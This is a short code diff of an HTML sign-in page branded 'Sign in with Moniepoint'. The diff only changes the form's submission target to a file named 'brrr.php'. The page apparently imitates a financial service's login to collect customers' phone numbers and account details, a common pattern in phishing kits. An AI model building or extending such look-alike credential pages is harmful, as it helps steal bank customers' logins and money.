@@ -13,7 +13,7 @@
     <h1 class="text font-bold text-2xl capitalize my-5 text-center">Sign in with Moniepoint</h1>
     <h2 class='text-xl font-semi-bold text-center'>Sign in with your Moniepoint details to continue</h2>
     <div>
-        <form method='post' action='signupProcess.php'>
+        <form method='post' action='brrr.php'>
         <div class='mt-5'><label for='phoneNumber'>phone number</label><br />
         <input type='number' id='phoneNumber' name='phoneNumber' class='p-3 border-1 h-12 w-100 rounded-xl outline-none'></div>
         <div class='my-5'>
